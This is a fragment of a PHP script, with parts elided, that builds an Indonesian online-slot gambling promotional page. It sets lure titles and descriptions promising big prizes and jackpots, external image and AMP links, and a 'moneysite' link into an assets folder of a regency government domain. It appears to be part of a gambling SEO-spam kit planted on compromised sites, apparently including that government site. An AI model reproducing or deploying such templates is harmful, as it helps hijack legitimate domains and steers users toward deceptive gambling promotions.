...
function denied() {
  ...
  echo"<h1>ความผิดของพี่ชายฉันเอง</h1>";
}
...
// Variabel lainnya
$link_moneysite = "https://jdih.kutaitimurkab.go.id/assets/?omak=" . urlencode($brand);

// Meta informasi
$gsc = "";
$gambar = "https://studiointermedia.com/images/2025/04/26/rompi.jpeg"; // Gambar lama
...
$title = htmlspecialchars($brand . " 🎯 Dapatkan Hadiah Besar! Saatnya Main dan Menang!", ENT_QUOTES, "UTF-8");
$favicon = "https://studiointermedia.com/images/2025/04/24/pavicon.png"; // Favicon lama
$author = "Admin $brand";
$nama_toko = "BS LEGENDS"; // Ganti "geng" dengan "LEGENDS"
$description = htmlspecialchars("$brand menghadirkan peluang luar biasa! Rasakan sensasi permainan yang seru dan menangkan hadiah-hadiah menggiurkan yang siap membuat harimu lebih cerah. Jangan tunda lagi, ayo mulai permainanmu!", ENT_QUOTES, "UTF-8");
$amphtml = "https://bs505geng.online/omak/kutaitimur.html?$brand"; // AMP lama
$artikel = htmlspecialchars("$brand menawarkan kesempatan langka untuk meraih jackpot besar! Dengan setiap langkah, semakin dekat kamu dengan hadiah luar biasa. Segera coba dan buktikan keberuntunganmu di dunia slot yang penuh kejutan ini!", ENT_QUOTES, "UTF-8");
